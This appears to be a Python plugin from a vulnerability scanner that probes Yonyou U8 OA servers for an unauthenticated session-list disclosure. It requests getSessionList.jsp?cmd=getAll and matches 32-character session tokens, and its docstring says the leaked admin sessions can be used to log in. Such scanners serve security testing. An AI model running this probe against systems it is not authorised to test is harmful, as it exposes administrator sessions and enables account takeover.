#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import re

yonyou_u8_oa_getsession_payloads = [
    {'path': 'yyoa/ext/https/getSessionList.jsp?cmd=getAll'},
    {'path': 'getSessionList.jsp?cmd=getAll'},
]

def u8_oa_getsession_scan(clients):
    '''  通过该漏洞, 攻击者可以获取数据库中管理员的账户信息以及session, 可利用session登录相关账号 '''
    client = clients.get('reqClient')

    vul_info = {
       'app_name': 'Yonyou-U8-OA',
       'vul_type': 'DSinfo',
       'vul_id': 'Yonyou-u8-getSessionList-unAuth',
    }

    for payload in yonyou_u8_oa_getsession_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        session_re = r'([0-9A-Z]{32})+'
        if (re.search(session_re, res.text, re.M|re.U)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
